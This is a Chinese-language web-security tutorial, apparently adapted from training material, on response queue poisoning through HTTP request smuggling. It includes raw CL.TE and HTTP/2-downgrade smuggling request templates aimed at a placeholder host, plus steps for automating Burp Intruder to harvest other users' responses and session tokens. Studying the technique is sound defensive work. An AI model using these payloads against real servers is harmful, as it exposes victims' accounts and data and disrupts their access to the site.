# 响应队列投毒

响应队列投毒是一种强大的请求走私攻击形式，它导致前端服务器开始将来自后端的响应映射到错误的请求上。实际上，这意味着同一前端/后端连接的所有用户都会持续收到本应属于其他人的响应。

这是通过走私一个完整请求来实现的，当前端服务器只期望一个响应时，却从后端引出两个响应。

## 响应队列投毒的影响是什么？

响应队列投毒的影响通常是灾难性的。一旦队列被投毒，攻击者只需发出任意后续请求即可捕获其他用户的响应。这些响应可能包含敏感的个人或业务数据，以及会话令牌等，这实际上授予攻击者完全访问受害者账户的权限。

响应队列投毒还会造成显著的附带损害，实际上会破坏网站对任何其流量通过同一 TCP 连接发送到后端的其他用户的正常访问。当用户尝试正常浏览网站时，他们会从服务器收到看似随机的响应，这将阻止大多数功能正常工作。

## 如何构造响应队列投毒攻击

成功的响应队列投毒攻击必须满足以下条件：

- 前端服务器和后端服务器之间的 TCP 连接被[复用于多个请求/响应周期](/web-security/request-smuggling#what-happens-in-an-http-request-smuggling-attack)。
- 攻击者能够成功走私一个完整的、独立的请求，该请求从后端服务器获得自己独立的响应。
- 攻击不会导致任一服务器关闭 TCP 连接。当服务器收到无效请求时，由于无法确定请求应结束的位置，通常会关闭传入连接。

### 理解请求走私后的结果

请求走私攻击通常涉及走私一个部分请求，服务器将其作为前缀添加到连接上下一个请求的开头。需要注意的是，走私请求的内容会影响初始攻击后连接的情况。

如果您只走私一个请求行和一些头，假设之后连接上有另一个请求被发送，后端最终仍然会看到两个完整的请求（走私头附加到下一个普通请求）。

如果您改为走私一个也包含消息体的请求，连接上的下一个请求将被附加到走私请求的消息体中。这通常会产生副作用，即根据明显的 `Content-Length` 截断最终请求。结果，后端实际上看到了三个请求，其中第三个“请求”只是一系列剩余的字节（走私体截断下一普通请求1，残余的部分或作为格式异常导致后一个普通请求2错误）：

**前端（CL）**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

**后端（TE）**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

由于这些剩余字节不构成有效请求，这通常会导致错误，使服务器关闭连接。

### 走私完整请求

稍加注意，您可以走私一个完整请求而不仅仅是前缀。只要您在一个请求中恰好发送两个请求，连接上的任何后续请求都将保持不变：

**前端（CL）**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 61
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: vulnerable-website.com


```

**或，前端 H2**

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: vulnerable-website.com


```
- 由于 H2 无需显式设置 CL，与之前小节相同，可省略 CL
- 若前端使用 H2 的 CL 拆分
    - 设置全长度，相当于省略
    - 不应当使前端拆分为2个请求：设置 H2 的 CL=5，包含 TE 的结尾序列 `0/r/n/r/n`。此时请求响应数量匹配，而队列投毒攻击的核心在于拥有额外数量的响应

**后端（TE）**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 61
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: vulnerable-website.com

GET / HTTP/1.1
Host: vulnerable-website.com
```

请注意，没有无效请求到达后端，因此连接在攻击后应保持打开状态。

### 使响应队列失同步

当您走私一个完整请求时，前端服务器仍然认为它只转发了一个请求。另一方面，后端看到两个不同的请求，并将相应地发送两个响应：

前端正确地将第一个响应映射到初始的“包装器”请求，并将其转发给客户端。由于没有其他请求在等待响应，意外的第二个响应被**保存在前端和后端之间连接的队列中**。

当前端收到另一个请求时，它会照常将其转发给后端。然而，在发出响应时，它将发送队列中的第一个，即对走私请求的剩余响应。

然后，来自后端的正确响应没有匹配的请求。每次新请求通过同一连接转发到后端时，这个循环都会重复。

### 窃取其他用户的响应

一旦响应队列被投毒，攻击者只需发送一个任意请求即可捕获另一个用户的响应。

他们无法控制自己收到哪些响应，因为他们总是会收到队列中的下一个响应，即对前一个用户请求的响应。在某些情况下，这可能不太有趣。然而，使用 Burp Intruder 等工具，攻击者可以轻松地自动化重新发出请求的过程。通过这样做，他们可以快速获取一组旨在提供给不同用户的响应，其中至少有一些可能包含有用的数据。

攻击者可以继续像这样窃取响应，只要前端/后端连接保持打开状态。连接何时关闭因服务器而异，但常见的默认设置是在处理了 100 个请求后终止连接。当前连接关闭后，重新投毒一个新连接也很简单。

用法：
- 在攻击器设置 null 载荷的无限自动请求
- 在重复器手动设置攻击请求后发送，查看攻击器的响应

> **提示：** 为了更容易区分窃取的响应和对自己请求的响应，尝试在您发送的两个请求中都使用一个不存在的路径。这样，您自己的请求应该会持续收到 404 响应。

> **注意：** 此攻击既可以通过经典的 HTTP/1 请求走私实现，也可以通过利用 HTTP/2 降级实现。
